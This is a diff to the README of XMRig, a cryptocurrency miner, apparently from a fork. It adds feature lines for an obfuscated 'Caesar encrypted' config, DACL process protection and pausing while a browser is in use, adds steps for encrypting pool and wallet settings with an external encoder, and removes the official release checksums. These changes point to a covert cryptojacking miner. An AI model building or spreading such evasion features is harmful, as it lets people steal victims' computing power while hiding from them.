@@ -31,11 +31,14 @@ Originally based on cpuminer-multi with heavy optimizations/rewrites and removin
 
 ## Features
 * High performance.
+* Caesar encrypted config
 * Official Windows support.
 * Small Windows executable, without dependencies.
 * x86/x64 support.
+* DACL Process Security
 * Support for backup (failover) mining server.
 * keepalived support.
+* Stop when you use browser
 * Command line options compatible with cpuminer.
 * CryptoNight-Lite support for AEON.
 * Smart automatic [CPU configuration](https://github.com/xmrig/xmrig/wiki/Threads).
@@ -103,6 +106,15 @@ Since version 0.8.0.
 * No TLS support.
 * Default donation 5% (5 minutes in 100 minutes) can be reduced to 1% via command line option `--donate-level`.
 
+## How to encrypt
+* Download [Config Encrypter](https://github.com/TheDevFromKer/Panel-RIG/blob/master/Config_Encoder/encode_config.exe)
+* Enter shift, pool and wallet
+* Shift in HEX format paste in:
+```
+int shift = HERE;
+```
+* And other by name
+
 
 ### CPU mining performance
 * **Intel i7-7700** - 307 H/s (4 threads)
@@ -121,14 +133,6 @@ Please note performance is highly dependent on system load. The numbers above ar
 * XMR: `48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD`
 * BTC: `1P7ujsXeX7GxQwHNnJsRMgAdNkFZmNVqJT`
 
-## Release checksums
-### SHA-256
-```
-5ae25d05b7735dd6e2482e8dba0cf0f5d10f9738855c4ad4eaf449b8ccd2e5be xmrig-2.5.3-xenial-amd64.tar.gz/xmrig-2.5.3/xmrig
-f11f3b381425ca4181c425d5b693407431f964759bb903f66b7cd2345fcdd786 xmrig-2.5.3-gcc-win32.zip/xmrig.exe
-67df8b89714e2921931092861361dbae4716c4ab872c767c92adae24dca01514 xmrig-2.5.3-gcc-win64.zip/xmrig.exe
-52bf6e0ef72c84282f4df411125384444c521ed9143e5d8c7e7e445d7d55e143 xmrig-2.5.3-msvc-win64.zip/xmrig.exe
-```
 
 ## Contacts
 * support@xmrig.com
